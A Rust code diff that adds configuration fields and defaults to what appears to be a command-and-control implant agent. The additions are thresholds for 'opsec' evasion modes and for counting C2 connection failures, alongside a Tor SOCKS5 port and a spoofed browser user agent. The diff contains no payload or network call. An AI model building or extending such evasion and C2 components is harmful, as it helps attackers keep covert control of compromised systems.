@@ -43,6 +43,26 @@ pub struct AgentConfig {
     pub proc_scan_interval_secs: u64,
     #[serde(default = "default_user_agent")]
     pub user_agent: String,
+    #[serde(default = "default_base_threshold_enter_full_opsec")]
+    pub base_threshold_enter_full_opsec: f32,
+    #[serde(default = "default_base_threshold_exit_full_opsec")]
+    pub base_threshold_exit_full_opsec: f32,
+    #[serde(default = "default_min_duration_full_opsec")]
+    pub min_duration_full_opsec_secs: u64,
+    #[serde(default = "default_min_duration_background_opsec")]
+    pub min_duration_background_opsec_secs: u64,
+    #[serde(default = "default_base_max_consecutive_c2_failures")]
+    pub base_max_consecutive_c2_failures: u32,
+    #[serde(default = "default_min_duration_reduced_activity_secs")]
+    pub min_duration_reduced_activity_secs: u64,
+    #[serde(default = "default_c2_failure_threshold_increase_factor")]
+    pub c2_failure_threshold_increase_factor: f32,
+    #[serde(default = "default_c2_failure_threshold_decrease_factor")]
+    pub c2_failure_threshold_decrease_factor: f32,
+    #[serde(default = "default_c2_threshold_adjust_interval_secs")]
+    pub c2_threshold_adjust_interval_secs: u64,
+    #[serde(default = "default_c2_dynamic_threshold_max_multiplier")]
+    pub c2_dynamic_threshold_max_multiplier: f32,
 }
 
 fn default_socks5_host() -> String {
@@ -60,6 +80,46 @@ fn default_user_agent() -> String {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string()
 }
 
+fn default_base_threshold_enter_full_opsec() -> f32 {
+    50.0
+}
+
+fn default_base_threshold_exit_full_opsec() -> f32 {
+    25.0
+}
+
+fn default_min_duration_full_opsec() -> u64 {
+    300 // Default 5 minutes in FullOpsec
+}
+
+fn default_min_duration_background_opsec() -> u64 {
+    60 // Default 1 minute in BackgroundOpsec
+}
+
+fn default_base_max_consecutive_c2_failures() -> u32 {
+    5 // Default: trigger signal after 5 consecutive failures
+}
+
+fn default_min_duration_reduced_activity_secs() -> u64 {
+    120 // Default 2 minutes in ReducedActivity
+}
+
+fn default_c2_failure_threshold_increase_factor() -> f32 {
+    1.0 // Default: No increase
+}
+
+fn default_c2_failure_threshold_decrease_factor() -> f32 {
+    1.0 // Default: No decrease
+}
+
+fn default_c2_threshold_adjust_interval_secs() -> u64 {
+    u64::MAX // Default: Effectively disable periodic adjustment
+}
+
+fn default_c2_dynamic_threshold_max_multiplier() -> f32 {
+    1.0 // Default: Dynamic threshold cannot exceed base threshold
+}
+
 impl Default for AgentConfig {
     fn default() -> Self {
         Self {
@@ -73,6 +133,16 @@ impl Default for AgentConfig {
             socks5_port: 9050,
             proc_scan_interval_secs: default_proc_scan_interval(),
             user_agent: default_user_agent(),
+            base_threshold_enter_full_opsec: default_base_threshold_enter_full_opsec(),
+            base_threshold_exit_full_opsec: default_base_threshold_exit_full_opsec(),
+            min_duration_full_opsec_secs: default_min_duration_full_opsec(),
+            min_duration_background_opsec_secs: default_min_duration_background_opsec(),
+            base_max_consecutive_c2_failures: default_base_max_consecutive_c2_failures(),
+            min_duration_reduced_activity_secs: default_min_duration_reduced_activity_secs(),
+            c2_failure_threshold_increase_factor: default_c2_failure_threshold_increase_factor(),
+            c2_failure_threshold_decrease_factor: default_c2_failure_threshold_decrease_factor(),
+            c2_threshold_adjust_interval_secs: default_c2_threshold_adjust_interval_secs(),
+            c2_dynamic_threshold_max_multiplier: default_c2_dynamic_threshold_max_multiplier(),
         }
     }
 }
